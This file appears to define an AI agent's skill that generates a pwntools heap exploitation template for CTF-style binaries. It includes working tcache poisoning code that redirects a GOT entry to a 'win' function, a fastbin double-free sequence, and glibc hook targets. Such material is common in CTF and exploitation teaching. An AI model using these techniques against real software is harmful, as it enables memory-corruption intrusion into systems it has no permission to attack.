---
name: pwn-heap
description: Generate heap exploitation template for tcache/fastbin attacks
argument-hint: "<binary> [--technique tcache|fastbin|house-of]"
allowed-tools: ["Bash", "Read", "Write", "AskUserQuestion"]
---

# PWN Heap - Heap Exploitation Template

Generate a heap exploitation template for common heap vulnerabilities.

## Common Techniques

- **tcache poisoning** - Corrupt tcache fd to get arbitrary allocation
- **fastbin dup** - Double free to corrupt fastbin
- **House of Force** - Top chunk overwrite
- **Use After Free** - Exploit dangling pointer

## Generated Template

```python
#!/usr/bin/env python3
"""
Heap Exploitation Template
Target: <binary>
Technique: tcache poisoning / fastbin dup
"""
from pwn import *

# === CONFIGURATION ===
BINARY = './<binary>'

# === SETUP ===
elf = ELF(BINARY)
context.binary = elf

# libc = ELF('./libc.so.6')

def conn():
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug(BINARY, '''
            b main
            c
        ''')
    else:
        return process(BINARY)

# === HEAP PRIMITIVES ===
# Adapt these to match binary's menu interface

def alloc(io, size, data=b'A'):
    """Allocate chunk"""
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def free(io, idx):
    """Free chunk"""
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def edit(io, idx, data):
    """Edit chunk (if available)"""
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendafter(b'Data: ', data)

def show(io, idx):
    """View chunk (for leaks)"""
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    return io.recvline()

def main():
    io = conn()

    # === TCACHE POISONING EXAMPLE ===
    # 1. Allocate two chunks
    alloc(io, 0x20, b'AAAA')  # chunk 0
    alloc(io, 0x20, b'BBBB')  # chunk 1

    # 2. Free both (fills tcache)
    free(io, 0)
    free(io, 1)

    # 3. Overwrite fd pointer (UAF or overflow)
    target = elf.got['exit']  # Where we want to allocate
    edit(io, 1, p64(target))

    # 4. Allocate twice - second gives us target
    alloc(io, 0x20, b'CCCC')      # Gets chunk 1
    alloc(io, 0x20, p64(elf.symbols['win']))  # Gets target!

    # === FASTBIN DUP EXAMPLE ===
    # (For older glibc without tcache)
    # alloc(io, 0x60, b'A')  # 0
    # alloc(io, 0x60, b'B')  # 1
    # free(io, 0)
    # free(io, 1)
    # free(io, 0)  # Double free!
    # alloc(io, 0x60, p64(target))
    # alloc(io, 0x60, b'X')
    # alloc(io, 0x60, b'X')
    # alloc(io, 0x60, payload)  # Arbitrary write!

    io.interactive()

if __name__ == '__main__':
    main()
```

## Heap Debugging

```gdb
# pwndbg heap commands
heap           # Show heap overview
bins           # Show all bins
tcache         # Show tcache state
vis_heap_chunk <addr>  # Visualize chunk
```

## Key Offsets

```python
# Common hook targets (glibc < 2.34)
__free_hook = libc.symbols['__free_hook']
__malloc_hook = libc.symbols['__malloc_hook']

# For glibc >= 2.34, use other techniques:
# - _IO_list_all corruption
# - exit handler overwrite
```
